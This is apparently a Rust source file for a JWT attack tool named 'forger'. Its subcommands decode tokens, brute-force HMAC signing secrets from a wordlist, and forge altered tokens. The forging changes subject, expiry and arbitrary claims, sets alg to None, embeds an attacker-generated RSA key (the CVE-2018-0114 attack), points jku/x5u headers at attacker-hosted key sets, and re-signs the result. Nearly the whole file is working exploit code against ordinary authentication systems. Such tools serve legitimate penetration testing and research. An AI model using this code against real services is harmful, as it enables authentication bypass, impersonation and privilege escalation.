use std::{
    error::Error,
    fs::File,
    io::{BufRead, BufReader},
    path::Path,
};

use clap::{App, Arg, SubCommand};
use env_logger::Env;
use hmac::{Hmac, Mac, NewMac};
use log::debug;
use openssl::{
    hash::MessageDigest,
    nid::Nid,
    pkey::{PKey, Private},
    rsa::Rsa,
    sign::Signer,
    x509::{X509Name, X509},
};

use rayon::prelude::*;
use serde_json::{json, Map, Value};

use sha2::{Sha256, Sha384, Sha512};

type HmacSha256 = Hmac<Sha256>;
type HmacSha384 = Hmac<Sha384>;
type HmacSha512 = Hmac<Sha512>;

fn main() {
    env_logger::Builder::from_env(Env::default().default_filter_or("info")).init();

    let matches = App::new("forger")
        .version("1.0")
        .author("freddd")
        .about("Alter JWTs")
        .subcommand(
            SubCommand::with_name("alter")
                .about("alters the JWT")
                .arg(
                    Arg::with_name("increase-expiry")
                        .short("i")
                        .long("increase-expiry")
                        .required(false)
                        .help("increases expiry with the given milliseconds")
                        .takes_value(true),
                )
                .arg(
                    Arg::with_name("subject")
                        .short("sub")
                        .long("subject")
                        .required(false)
                        .help("change subject")
                        .takes_value(true),
                )
                .arg(
                    Arg::with_name("prop")
                        .short("p")
                        .long("prop")
                        .required(false)
                        .multiple(true)
                        .help("key=value, gives the key the given value")
                        .takes_value(true),
                )
                .arg(
                    Arg::with_name("algo")
                        .short("a")
                        .long("algo")
                        .required(false)
                        .help("changes algo to the given algo")
                        .takes_value(true),
                )
                .arg(
                    Arg::with_name("embed-jwk")
                        .short("e")
                        .long("embed-jwk")
                        .required(false)
                        .help("creates an RSA key and embeds it (CVE-2018-0114)")
                        .takes_value(false),
                )
                .arg(
                    Arg::with_name("jku")
                        .short("jku")
                        .long("jku")
                        .required(false)
                        .help("jku url (example: https://www.x.y/.well-known/jwks.json)")
                        .takes_value(true),
                )
                .arg(
                    Arg::with_name("key")
                        .short("key")
                        .long("key")
                        .required(false)
                        .help("path to private key to sign with (.pem), required when using jku/x5c and optional for embed-jwk")
                        .takes_value(true),
                )
                .arg(
                    Arg::with_name("x5u")
                        .short("x5u")
                        .long("x5u")
                        .required(false)
                        .help("x5u url (example: http://x.y/.well-known/jwks_with_x5c.json)")
                        .takes_value(true),
                )
                .arg(
                    Arg::with_name("secret-path")
                        .long("secret-path")
                        .required(false)
                        .help("path to secret to use to create signature")
                        .takes_value(true),
                )
                .arg(Arg::with_name("token").required(true)),
        )
        .subcommand(SubCommand::with_name("print").about("prints decoded JWT").arg(Arg::with_name("token").required(true)))
        .subcommand(SubCommand::with_name("jwk").about("creates a jwk json file (RSA256)").arg(
            Arg::with_name("key")
                .short("key")
                .long("key")
                .required(false)
                .help("path to a private key to resolve the public key to convert to jwk")
                .takes_value(true),
        ).arg(
            Arg::with_name("x5c")
                .short("x5c")
                .long("x5c")
                .required(false)
                .help("adds a cert to jwk.json")
                .takes_value(false),
        ))
        .subcommand(
            SubCommand::with_name("brute-force")
                .about("tries to brute force the secret used to sign (only HMAC)")
                .arg(
                    Arg::with_name("wordlist")
                        .long("wordlist")
                        .required(true)
                        .help("path to the wordlist to be used")
                        .takes_value(true),
                )
                .arg(Arg::with_name("token").required(true)),
        )
        .get_matches();

    match matches.subcommand() {
        ("print", Some(arg_matches)) => {
            let token_parts_b64: Vec<&str> =
                arg_matches.value_of("token").unwrap().split('.').collect();
            let token = match base64_to_map(token_parts_b64.clone()) {
                Ok(p) => p,
                Err(err) => {
                    panic!("failed to decode token: {:#?}", err)
                }
            };

            let json_str: Vec<String> = token
                .into_iter()
                .map(|p| serde_json::to_string_pretty(&p).unwrap())
                .collect();
            println!("{}", json_str.join("."))
        }
        ("jwk", Some(args_matches)) => {
            let private_key = match args_matches.value_of("key") {
                Some(key_path) => {
                    Rsa::private_key_from_pem(read_private_key(key_path).as_bytes()).unwrap()
                }
                None => Rsa::generate(2048).unwrap(),
            };

            let mut jwk = json!({
                "kty": "RSA",
                "kid": "xyz",
                "use": "sig",
                "n": n(private_key.clone()),
                "e": e(private_key.clone()),
            });

            if args_matches.is_present("x5c") {
                jwk["x5c"] = Value::from(base64::encode_config(
                    create_cert(private_key)
                        .public_key()
                        .unwrap()
                        .public_key_to_pem()
                        .unwrap(),
                    base64::URL_SAFE_NO_PAD,
                ));
            }

            println!("{}", json!({ "keys": [jwk] }))
        }
        ("brute-force", Some(args_matches)) => {
            let token_parts_b64: Vec<&str> =
                args_matches.value_of("token").unwrap().split('.').collect();
            let token = match base64_to_map(token_parts_b64.clone()) {
                Ok(p) => p,
                Err(err) => {
                    panic!("failed to decode token: {:#?}", err)
                }
            };

            let alg = token[0]["alg"].as_str().unwrap();
            if !alg.starts_with("HS") {
                println!("algorithm not supported");
                return;
            }

            let words = lines_from_file(args_matches.value_of("wordlist").unwrap());
            let current_sig = token_parts_b64[2];
            let header_and_payload = vec![token_parts_b64[0], token_parts_b64[1]].join(".");

            words.par_iter().for_each(|word| {
                let new_sig = match alg {
                    "HS256" => sign_payload_using_hmac::<HmacSha256>(
                        header_and_payload.to_string(),
                        word.as_bytes(),
                    ),
                    "HS384" => sign_payload_using_hmac::<HmacSha384>(
                        header_and_payload.to_string(),
                        word.as_bytes(),
                    ),
                    "HS512" => sign_payload_using_hmac::<HmacSha512>(
                        header_and_payload.to_string(),
                        word.as_bytes(),
                    ),
                    _ => unreachable!("algorithm not supported"),
                };

                if new_sig == current_sig {
                    println!("the secret is: {}", word)
                }
            });
        }
        ("alter", Some(arg_matches)) => {
            let token_parts_b64: Vec<&str> =
                arg_matches.value_of("token").unwrap().split('.').collect();
            let token = match base64_to_map(token_parts_b64.clone()) {
                Ok(p) => p,
                Err(err) => {
                    panic!("failed to decode token: {:#?}", err)
                }
            };

            let mut header = token[0].clone();
            let mut claims = token[1].clone();

            if let Some(increase) = arg_matches.value_of("increase-expiry") {
                let original_expiry = claims["exp"].as_u64().unwrap_or(0);
                claims["exp"] = Value::from(original_expiry + increase.parse::<u64>().unwrap());
            }

            if let Some(s) = arg_matches.value_of("subject") {
                claims["sub"] = Value::from(s);
            }

            if let Some(jku) = arg_matches.value_of("jku") {
                header["jku"] = Value::from(jku);
            }

            if let Some(x5u) = arg_matches.value_of("x5u") {
                header["x5u"] = Value::from(x5u);
            }

            let private_key = match arg_matches.value_of("key") {
                Some(key_path) => {
                    Rsa::private_key_from_pem(read_private_key(key_path).as_bytes()).unwrap()
                }
                None => Rsa::generate(2048).unwrap(),
            };

            // TODO: only does substitutions on top-level
            if let Some(values) = arg_matches.values_of("prop") {
                for val in values {
                    let key_vals: Vec<&str> = val.split('=').collect();
                    if claims.contains_key(key_vals[0]) {
                        claims[key_vals[0]] = Value::from(key_vals[1]);
                    }

                    if header.contains_key(key_vals[0]) {
                        header[key_vals[0]] = Value::from(key_vals[1]);
                    }
                }
            }

            if let Some(algo) = arg_matches.value_of("algo") {
                header["alg"] = Value::from(algo);
            }

            // embed-jwk will remove the `kid` header, set alg to RSA256 and add a new header called `jwk` with an embedded key
            if arg_matches.is_present("embed-jwk") {
                header.remove("kid");
                header["alg"] = Value::from("RSA256");

                header.insert(
                    String::from("jwk"),
                    json!({
                        "kty": "RSA",
                        "kid": "xyz",
                        "use": "sig",
                        "n": n(private_key.clone()),
                        "e": e(private_key.clone()),
                    }),
                );
            }

            let encoded = vec![header, claims]
                .into_iter()
                .map(|p| {
                    let json_str = serde_json::to_string(&p).unwrap();
                    base64::encode_config(&json_str, base64::STANDARD_NO_PAD)
                })
                .collect::<Vec<String>>();

            if let Some(algo) = arg_matches.value_of("algo") {
                let secret = match arg_matches.value_of("secret-path") {
                    Some(path) => std::fs::read_to_string(path).unwrap(),
                    None => String::from(""),
                };

                let signature: String = match algo {
                    "None" => String::from(""),
                    "HS256" => {
                        debug!("computing new signature for: HS256");
                        sign_payload_using_hmac::<HmacSha256>(
                            encoded.join("."),
                            secret.trim().as_bytes(),
                        )
                    }
                    "HS384" => {
                        debug!("computing new signature for: HS384");
                        sign_payload_using_hmac::<HmacSha384>(
                            encoded.join("."),
                            secret.trim().as_bytes(),
                        )
                    }
                    "HS512" => {
                        debug!("computing new signature for: HS512");
                        sign_payload_using_hmac::<HmacSha512>(
                            encoded.join("."),
                            secret.trim().as_bytes(),
                        )
                    }
                    "RSA256" => {
                        let keypair = PKey::from_rsa(private_key).unwrap();
                        let mut signer = Signer::new(MessageDigest::sha256(), &keypair).unwrap();
                        signer.update(encoded.join(".").as_bytes()).unwrap();
                        base64::encode_config(
                            signer.sign_to_vec().unwrap(),
                            base64::URL_SAFE_NO_PAD,
                        )
                    }
                    _ => String::from(token_parts_b64[2]),
                };

                debug!("changed signature: {}", signature);
                println!("{}", encoded.join(".") + "." + &signature)
            } else {
                println!("{}", encoded.join(".") + "." + token_parts_b64[2])
            }
        }
        _ => unreachable!(),
    }
}

fn e(key: Rsa<Private>) -> String {
    base64::encode_config(key.e().to_string().split_off(2), base64::URL_SAFE_NO_PAD)
}

fn n(key: Rsa<Private>) -> String {
    base64::encode_config(key.n().to_string().split_off(2), base64::URL_SAFE_NO_PAD)
}

fn sign_payload_using_hmac<T: Mac + NewMac>(token: String, secret: &[u8]) -> String {
    let mut mac = T::new_varkey(secret).unwrap();
    mac.update(token.as_bytes());
    let result = mac.finalize().into_bytes();
    base64::encode_config(&result, base64::URL_SAFE_NO_PAD)
}

fn read_private_key(filename: impl AsRef<Path>) -> String {
    std::fs::read_to_string(filename).expect("Something went wrong reading the file")
}

fn create_cert(rsa: Rsa<Private>) -> X509 {
    let pkey = PKey::from_rsa(rsa).unwrap();

    let mut name = X509Name::builder().unwrap();
    name.append_entry_by_nid(Nid::COMMONNAME, "foobar.com")
        .unwrap();
    let name = name.build();

    let mut builder = X509::builder().unwrap();
    builder.set_version(2).unwrap();
    builder.set_subject_name(&name).unwrap();
    builder.set_issuer_name(&name).unwrap();
    builder.set_pubkey(&pkey).unwrap();
    builder.sign(&pkey, MessageDigest::sha256()).unwrap();

    builder.build()
}

fn lines_from_file(filename: impl AsRef<Path>) -> Vec<String> {
    let file = File::open(filename).expect("no such file");
    let buf = BufReader::new(file);
    buf.lines()
        .map(|l| l.expect("Could not parse line"))
        .map(|s| s.trim().to_string())
        .collect()
}

fn base64_to_map(parts: Vec<&str>) -> Result<Vec<Map<String, Value>>, Box<dyn Error>> {
    let parts_decoded = parts
        .into_iter()
        .take(2) // skip signature
        .map(|part| {
            let as_str = String::from_utf8(base64::decode(part).unwrap()).unwrap();
            let parsed: Value = serde_json::from_str(&as_str).unwrap();
            parsed.as_object().unwrap().clone()
        })
        .collect();

    Ok(parts_decoded)
}
